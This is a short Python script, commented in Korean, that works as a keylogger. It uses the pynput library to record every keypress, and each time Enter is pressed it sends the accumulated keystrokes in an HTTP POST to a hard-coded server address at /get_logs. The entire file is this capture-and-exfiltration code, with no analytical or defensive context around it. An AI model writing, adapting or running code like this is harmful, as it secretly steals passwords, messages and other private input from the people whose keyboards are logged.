from pynput.keyboard import Listener, Key
import requests#임포트

server_url = 'http://192.168.35.216:5000/get_logs'#서버
logs = ''

def on_press(key):
    global logs

    if key == Key.enter:
        try:
            requests.post(server_url, data={'logs': logs})
        except:
            print('Server error!')

        logs = ''
    else:
        logs += str(key).replace("'", "")#작은 따움표 제거

with Listener(on_press=on_press) as listener:
    listener.join()
